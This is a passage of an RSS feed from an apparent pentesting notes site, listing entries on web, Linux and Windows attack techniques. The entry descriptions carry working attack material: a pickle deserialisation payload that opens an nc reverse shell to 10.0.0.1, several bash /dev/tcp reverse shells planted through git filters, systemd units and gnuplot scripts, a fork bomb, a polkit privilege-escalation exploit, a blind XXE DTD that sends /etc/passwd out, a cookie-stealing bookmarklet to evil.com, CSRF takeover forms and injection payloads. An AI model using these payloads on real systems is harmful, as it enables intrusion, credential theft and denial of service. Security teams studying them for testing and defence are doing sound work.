      <description>Exploitation linkBelow is the Python script (mypickle.py) to generate the payload to reverse shell.&#xA;import pickle import base64 import os class RCE: def __reduce__(self): cmd = (&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.0.0.1 4444 &amp;gt; /tmp/f&amp;#39;) return os.system, (cmd,) if __name__ == &amp;#39;__main__&amp;#39;: pickled = pickle.dumps(RCE()) print(base64.b64encode(pickled)) # or print(base64.urlsafe_b64encode(pickled)) Now run this script to generate the Base64 payload.&#xA;python3 mypickle.py Copy the ourput base64 string and paste it to where the payload affects in website.</description>
    </item>
    <item>
      <title>Ruby on Rails Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/ruby/ruby-on-rails-pentesting/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/ruby/ruby-on-rails-pentesting/</guid>
      <description>Common Directories link /assets/application.css /config /Gemfile /Gemfile.lock /rails/info /rails/info/properties /rails/info/routes In addition, it’s worth to fuzz under /rails/ directory as below.&#xA;ffuf -u https://example.com/rails/FUZZ -w wordlist.txt ERB Template Injection linkIf target website uses ERB template which affects a page, we can inject malicious template.&#xA;text = &amp;#34;&amp;lt;%= 2*3 %&amp;gt;&amp;#34; result = ERB.new(text).result(binding) puts result # expected result: 6 Payloads linkReference: Server Side Template Injection&#xA;&amp;lt;%= 2*3 %&amp;gt; &amp;lt;%= self.methods %&amp;gt; &amp;lt;%= self.</description>
    </item>
    <item>
      <title>Windows Print Spooler Service</title>
      <link>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</link>
      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</guid>
      <description>Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\Windows\System32\spool\drivers\x64\3\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane.&#xA;If you want to filter by Event ID, use &amp;ldquo;Filter Current Log&amp;rdquo; in the right pane.</description>
    </item>
    <item>
      <title>HTML Smuggling</title>
      <link>https://documentnation.github.io/docs/hdks/web/html-smuggling/</link>
      <pubDate>Wed, 26 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/html-smuggling/</guid>
      <description>Exploitation linkAttackers can use anchor tag to invite victim to download a malicious file as below. When clicking, the malicious file is downloaded as the name “payment.docx”.&#xA;&amp;lt;a href=&amp;#34;/malicious_doc.docx&amp;#34; download=&amp;#34;payment.docx&amp;#34;&amp;gt;Cliek Here&amp;lt;/a&amp;gt; Alternatively, attackers can also use JavaScript, then let browsers to download a malicious file when loading the page, or invite victim to click download button.&#xA;var a = document.createElement(&amp;#39;a&amp;#39;); a.download = &amp;#39;malicious_doc.docx&amp;#39; Using JavaScript Blob linkBy using blob, attackers can let victim to download a malicious file while obfuscate its content by encoding/decoding malicious code.</description>
    </item>
    <item>
      <title>Fork Bomb</title>
      <link>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</guid>
      <description>Warning linkPlease don’t execute the following programs in system that you don’t want to harm.&#xA;Exploitation in C linkThis program forks child processes continuously.&#xA;#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; int main() { while (1) // Create a child process from the parent process. fork(); return 0; } Exploitation in Python link import os while True: os.fork() Exploitation in Bash link :(){ :|: &amp;amp; };: </description>
    </item>
    <item>
      <title>PolKit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
    </item>
    <item>
      <title>Sudo Git Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</link>
      <pubDate>Sun, 23 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</guid>
      <description>Git Add/Commit link sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m &amp;#34;commit&amp;#34; If we can commit the git repository as root, we may be able to escalate privileges.&#xA;Exploitation link Create a Payload echo &amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39; &amp;gt; /tmp/revshell chmod &amp;#43;x /tmp/revshell Set Git Config # Go to the git repository cd /opt/example git init echo &amp;#39;*.php filter=indent&amp;#39; &amp;gt; .git/info/attributes git config filter.</description>
    </item>
    <item>
      <title>TeamCity Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</link>
      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</guid>
      <description>Common Directories link /admin /admin/admin.html Interesting Files in Systems link TeamCity/conf/teamcity-startup.propertie .BuildServer/system Find Super User Authentication Tokens linkIf we find a super user authentication token, we can login as super user using the token.&#xA;grep -rni &amp;#39;authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;Super user authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;token&amp;#39; TeamCity/logs After retrieving, we can login as administrator by entering the token in the password field and empty the username.&#xA;Arbitrary Command Execution by Custom Script link Login as admin user.</description>
    </item>
    <item>
      <title>Crack Zip Password</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/crack-zip-password/</link>
      <pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/crack-zip-password/</guid>
      <description>John The Ripper linkFormat the archived file to make the John to recognize it, then crack the hash using John.&#xA;zip2john example.zip &amp;gt; hash.txt john --wordlist=wordlist.txt hash.txt Fcrackzip link # -u: unzip # -D: dictionary # -p: strgin as initial password/file fcrackzip -u -D -p passwords.txt sample.zip Bkcrack linkbkcrack is useful for cracking legacy zip encryption with a known plaintext attack.&#xA;Download the Tool link wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz tar -xf bkcrack-1.5.0-Linux.tar.gz cd bkcrack-1.</description>
    </item>
    <item>
      <title>Shodan Dorks</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/shodan-dorks/</link>
      <pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/shodan-dorks/</guid>
      <description> product:elastic port:9200 country:us product:postgresql port:5432 country:jp # Search &amp;#39;users&amp;#39; column proudct:elastic port:9200 users </description>
    </item>
    <item>
      <title>WAF (Web Application Firewall) Detection</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</link>
      <pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</guid>
      <description>Automation link nmap --script=http-waf-fingerprint example.com wafw00f https://example.com </description>
    </item>
    <item>
      <title>Angular Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</link>
      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</guid>
      <description>HTML Attributes linkIf a website uses AngularJS framework, the nodes have a “ng-apps” attribute. So you can check it in a HTML source code.&#xA;&amp;lt;div ng-apps&amp;gt; Server-Side Template Injection (SSTI) link {{2*3}} {{$on.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} {{constructor.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} &amp;lt;input ng-focus=$event.view.alert(&amp;#39;test&amp;#39;)&amp;gt; &amp;lt;div ng-app ng-csp&amp;gt;&amp;lt;textarea autofocus ng-focus=&amp;#34;d=$event.view.document;d.location.hash.match(&amp;#39;x1&amp;#39;) ? &amp;#39;&amp;#39; : d.location=&amp;#39;//localhost/mH/&amp;#39;&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/div&amp;gt; It worth testing to bypass sanitizing as below.&#xA;# Remove one-pair braces {2*3} # Remove all braces 2*3 # Add additional braces {{{2*3}}} </description>
    </item>
    <item>
      <title>Sudo Systemctl Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</link>
      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</guid>
      <description>Modify Configurations link sudo -l (ALL) NOPASSWD: systemctl If we can run &amp;ldquo;systemctl&amp;rdquo; command as root, and we can edit the config file, then we might be a root user.&#xA;1. Update the Config File linkWe need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.&#xA;[Unit] This is an example service. [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1&amp;#39; [Install] WantedBy=multi-user.target Replace “&amp;lt;local-ip&amp;gt;” with your local ip address.</description>
    </item>
    <item>
      <title>Dump Git Repository from Website</title>
      <link>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</link>
      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</guid>
      <description>Dumping linkWe can simply use wget command in Linux to download the git repository.&#xA;After that, we can investigate files or all histories.&#xA;# -r: Recursive wget -r https://example.com/.git/ cd example.com git log --stat git checkout &amp;lt;commit_id&amp;gt; Dumping with gitdumper and extracter linkGitTools downloads Git repository of the web application.&#xA;To dump the repository, execute the following commands.&#xA;wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh chmod &amp;#43;x gitdumper.sh ./gitdumper.sh https://example.com/.git/ ./example We should get the git repository in local.</description>
    </item>
    <item>
      <title>Buffer Overflow Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
    </item>
    <item>
      <title>Prototype Pollution in Client-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</link>
      <pubDate>Mon, 03 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</guid>
      <description>Investigation linkCheck if we can assign arbitrary property via URL.&#xA;Try various ways.&#xA;https://example.com/?__proto__[foo]=bar https://example.com/?__proto__.foo=bar https://example.com/?constructor.[prototype][foo]=bar https://example.com/?constructor.prototype.foo=bar # Bypass sanitization https://example.com/?__pro__proto__to__[foo]=bar https://example.com/?__pro__proto__to__.foo=bar https://example.com/?constconstructorructor[prototype][foo]=bar https://example.com/?constconstructorructor.prototype.foo=bar https://example.com/?constconstructorructor[protoprototypetype][foo]=bar https://example.com/?constconstructorructor.protoprototypetype.foo=bar Open browser console, and type the following to check if our above property is assigned.&#xA;Object.prototype.foo constructor.prototype.foo // the expected output: &amp;#34;bar&amp;#34; DOM XSS linkIf our payload affects an HTML element after loading, we can inject DOM-based XSS as below.&#xA;Assume the key name of the property is &amp;ldquo;source_url&amp;rdquo;, whose value is loaded as &amp;ldquo;src&amp;rdquo; in a script element.</description>
    </item>
    <item>
      <title>Rust Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</guid>
      <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
    </item>
    <item>
      <title>Extract Web Browser Passwords</title>
      <link>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</link>
      <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</guid>
      <description>Firefox link wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py python3 firefox_decrypt.py Google Chrome link wget https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py python3 decrypt_chrome_password.py </description>
    </item>
    <item>
      <title>Bookmarklet Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</guid>
      <description>Exploitation linkMalicious Links linkAttackers induce victims to add their malicious link into the bookmark menu as below.&#xA;&amp;lt;p&amp;gt;Drag and drop the following link into the bookmark menu to access easily!&amp;lt;/p&amp;gt; &amp;lt;a href=&amp;#34;javascript:window.location=&amp;#39;https://evil.com/&amp;#39;&amp;#34;&amp;gt;Example.com&amp;lt;/a&amp;gt; In addition, if the current website does not set HttpOnly flag on the Set-Cookie response header, attackers can get the victim&amp;rsquo;s cookie and send it to the malicious website as below.&#xA;&amp;lt;p&amp;gt;Drag and drop me the following link into the bookmark menu to access easily!</description>
    </item>
    <item>
      <title>Gnuplot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
    </item>
    <item>
      <title>LaTeX Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</guid>
      <description>Payloads - Read Files link # Read file \input{/etc/passwd} $\input{/etc/passwd}$ $$\input{/etc/passwd}$$ \include{example} # Read example.tex $\include{example}$ $$\include{example}$$ \lstinputlisting{/etc/passwd} $\lstinputlisting{/etc/passwd}$ $$\lstinputlisting{/etc/passwd}$$ Payloads - Write File link \newwrite\outfile $\newwrite\outfile$ $$\newwrite\outfile$$ \openout\outfile=cmd.tex $\openout\outfile=cmd.tex$ $$\openout\outfile=cmd.tex$$ \write\outfile{Hello-World} $\write\outfile{Hello-World}$ $$\write\outfile{Hello-World}$$ </description>
    </item>
    <item>
      <title>GraphQL Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/api/graphql-pentesting/</link>
      <pubDate>Sat, 17 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/api/graphql-pentesting/</guid>
      <description>Common Directories link /graphql /graphiql /graphql.php /graphql/console Basic Operations - Queries linkWe can fetch field information by sending queries.&#xA;query { __typename } Fields linkTo fetch a field object, send a query like the following.&#xA;query { user { name friends { name } } } Arguments linkWe can get the specific information by padding arguments (e.g. id) to fields.&#xA;query { user (id: &amp;#34;1&amp;#34;) { name } } Aliases linkWe can set aliases each field to get multiple results in one request.</description>
    </item>
    <item>
      <title>DOM Cloberring</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</link>
      <pubDate>Thu, 15 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</guid>
      <description>Basic Exploitation linkIf the website adds the JavaScript code into the DOM when loading page as below,&#xA;window.onload = function() { let someObj = window.someObj || {}; let script = document.createElement(&amp;#39;script&amp;#39;); script.src = someObj.url; document.body.appendChild(script); } We may manipulate this someObj and override the properties (url here) using anchor elements, then we can execute arbitrary JavaScript code.&#xA;For example, insert the following code in the comment, search, etc. in the target website.</description>
    </item>
    <item>
      <title>Open Redirect</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</link>
      <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</guid>
      <description>Payloads link https://vulnerable.com/example.php?redirectUrl=https://attacker.com/ https://vulnerable.com/example.php?redirectUrl=https:\\attacker.com\ https://vulnerable.com/example.php?redirectUrl=https://attacker.com#.vulnerable.com/ &amp;lt;!-- &amp;#34;%E3%80%82&amp;#34; is &amp;#34;.&amp;#34; --&amp;gt; https://vulnerable.com/example.php?redirectUrl=https://attacker.com%E3%80%82%23.vulnerable.com/ &amp;lt;!-- &amp;#34;%0d&amp;#34; is newline --&amp;gt; https://vulnerable.com/example.php?redirectUrl=/%0d/attacker.com/ Unrestricted QR Code Scanning linkReference: https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f&#xA;If website (or mobile application) has the function for scanning QR code but not restricts URL, we can let it to read malicious QR code.&#xA;1. Generate QR Code linkFirst, we need to create a malicious QR code. There are many online tools for generating it.&#xA;2. Read Malicious QR Code in the Application linkAfter generating the QR code, read the QR code in the target application.</description>
    </item>
    <item>
      <title>Host Header Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</link>
      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</guid>
      <description>Abuse Connection State linkIf the web server validates only the first request, we may be able to exploit the second request by keeping the connection and changing the Host header to the internal page.&#xA;1. Send the First Request link GET / HTTP/2 Host: example.com ... Connection: keep-alive 2. Send the Second Request. link POST /admin/change-email HTTP/2 Host: 192.168.0.1 email=admin@example.com&amp;amp;new_email_1=attacker@evil.com&amp;amp;new_email_2=attacker@evil.com As a result, we may be able to change the admin&amp;rsquo;s email to arbitrary email.</description>
    </item>
    <item>
      <title>JWT (Json Web Token) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</link>
      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</guid>
      <description>Decode JWT link There are some online JWT decoder/encoder tools like JWT.io. CyberChef can be used for JWT decode. Manipulate JWT linkIf the website uses JWT and we can see the token, copy the JWT and paste it in jwt.io.&#xA;Replace the &amp;ldquo;alg&amp;rdquo; value with &amp;ldquo;none&amp;rdquo; in header. (try the alg header variations such as &amp;ldquo;none&amp;rdquo;, &amp;ldquo;None&amp;rdquo;, &amp;ldquo;nOnE&amp;rdquo;, &amp;ldquo;NONE&amp;rdquo;.) Replace arbitrary values of the payload e.g. &amp;ldquo;username&amp;rdquo; with &amp;ldquo;admin&amp;rdquo;. Empty the signature field.</description>
    </item>
    <item>
      <title>Blind XXE</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</link>
      <pubDate>Sat, 10 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</guid>
      <description>Data Exfiltration via Out-Of-Band link1. Create a Malicious DTD linkWe need to prepare the dtd file (named &amp;ldquo;exploit.dtd&amp;rdquo; here) to retrieve the target file.&#xA;Replace the ip address with your own.&#xA;&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!-- &amp;lt;!ENTITY % file SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; --&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &amp;#39;http://10.0.0.1/?x=%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfiltrate; Then host it on web server.&#xA;sudo python3 -m http.server 80 2. Insert XXE linkIn http request body, insert the following XXE payload.</description>
    </item>
    <item>
      <title>CSRF (Cross-Site Request Forgery)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</link>
      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</guid>
      <description>Account Takeover linkIf the victim user access to the page where the payload put in, the victim account information will be changed to the attacker&amp;rsquo;s information e.g. Email address or Username.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.forms[0].submit(); &amp;lt;/script&amp;gt; CSRF Token Bypass linkBelow is to bypass CSRF token by using another CSRF token that we get.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.</description>
    </item>
    <item>
      <title>Tornado Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</link>
      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) linkWe can execute arbitrary Python script using the server-site template injection.&#xA;First check if the script will be executed as below.&#xA;&amp;lt;title&amp;gt;Website by {{ 2*3 }}&amp;lt;/title&amp;gt; &amp;lt;span&amp;gt;{{ 2*3 }}&amp;lt;/span&amp;gt; # URL parameters https://example.com/?q={{2*3}} If the website shows 6 instead of 2*3, we can execute arbitrary code.&#xA;Try following payloads.&#xA;{% import os %}{{ os.popen(&amp;#34;whoami&amp;#34;).read() }} # Reverse shell. Replace &amp;#34;10.0.0.1&amp;#34; with your own ip # It requires a listener like `nc -lvnp 4444` in local terminal.</description>
    </item>
    <item>
      <title>WSL Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</link>
      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</guid>
      <description>Interesting Files link cat /etc/wsl.conf Escape WSL to Windows Host Machine linkIf we’are currently on WSL machine, we can access to the host Windows machine as below.&#xA;cd /mnt/c/ If /mnt/c/ is empty, we need to mount the folder by running the following command.&#xA;cd / # -t: Limit the set of filesystem types # drvfs: A plugin for WSL # C: : Specify the Windows root mount -t drvfs C: /mnt/c </description>
    </item>
    <item>
      <title>Cacti Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</guid>
      <description>Default Credentials link admin:admin Common Directories link /include/config.php Remote Code Execution (RCE) CVE-2022-46169 linkReference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/&#xA;msfconsole msf&amp;gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection msf&amp;gt; (set options...) msf&amp;gt; run Also we can refer to Exploit DB.</description>
    </item>
    <item>
      <title>Pip Download Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
    </item>
    <item>
      <title>Microsoft Exchange Server Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</link>
      <pubDate>Sun, 23 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</guid>
      <description>Enumeration linkOWA (Outlook Web Access) link msfconsole # Client Access Server (CAS) IIS HTTP Internal IP Disclosure msf&amp;gt; use auxiliary/scanner/http/owa_iis_internal_ip # Brute Force credentials msf&amp;gt; use auxiliary/scanner/http/owa_login Common Directories link # Autodiscover service /autodiscover/ /autodiscover/autodiscover.xml # Enhanced Client or Proxy /ecp/ # Exchange Web Services /ews/ # Offline Address Books /oab/ # Outlook Web Access /owa/ /owa/auth/login.aspx ProxyShell RCE linkCVE-2021-31207, CVE-2021-34523, CVE-2021-34473 Reference: https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/&#xA;msfconsole msf&amp;gt; use exploit/windows/http/exchange_proxyshell_rce msf&amp;gt; (set options.</description>
    </item>
    <item>
      <title>Cookie Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</link>
      <pubDate>Fri, 21 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</guid>
